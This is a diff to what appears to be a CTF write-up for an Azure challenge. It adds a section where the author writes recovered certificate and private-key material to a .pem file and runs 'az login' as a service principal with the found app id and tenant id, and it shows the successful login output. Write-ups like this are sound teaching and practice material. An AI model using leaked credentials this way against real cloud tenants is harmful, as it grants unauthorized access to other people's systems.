@@ -139,5 +139,32 @@ App-id: b2bfb506-aead-40d8-9e93-6f3e5d752826
 -----END AZURE_DETAILS-----
 ```
 
+## Writing to .pem file and az login
+Now that I have the *certificate*, *private key*, *tenant id and *app-id*, I can use az login to access the service principal, but without the subscription (It should be noted that tenant id and app id is usually not in .pem files)
+
+```bash
+az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 --password brokenazure.pem --allow-no-subscriptions
+```
+
+### Output:
+```bash
+┌──┌──(brokenazure㉿ctf)
+└─$ az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 --password brokenazure.pem --allow-no-subscriptions
+[
+  {
+    "cloudName": "AzureCloud",
+    "id": "4452edfd-a89d-43aa-8b46-a314c219cc50",
+    "isDefault": true,
+    "name": "N/A(tenant level account)",
+    "state": "Enabled",
+    "tenantId": "4452edfd-a89d-43aa-8b46-a314c219cc50",
+    "user": {
+      "name": "b2bfb506-aead-40d8-9e93-6f3e5d752826",
+      "type": "servicePrincipal"
+    }
+  }
+]
+```
+
 ## Conclusion
 The challenge underscored the critical need for securing Azure storage accounts and containers against unauthorized access. The successful enumeration and extraction of data from inadequately secured containers highlighted potential vulnerabilities, reinforcing the importance of ethical hacking practices and proper authorization prior to conducting vulnerability assessments.
